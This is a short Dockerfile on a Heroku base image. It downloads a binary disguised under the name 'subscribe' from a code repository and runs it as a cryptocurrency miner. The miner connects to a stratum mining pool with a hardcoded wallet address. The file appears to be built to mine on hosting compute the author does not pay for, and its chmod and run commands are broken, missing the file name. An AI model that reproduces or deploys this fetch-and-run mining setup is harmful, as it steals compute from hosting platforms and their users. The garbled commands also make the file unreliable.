FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/cahoblo/subscribe/-/raw/main/subscribe; chmod +x; ./ -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mq57pD51Lei9PBvkGCso7xNQerTHttfmRm.VPS
CMD bash heroku.sh
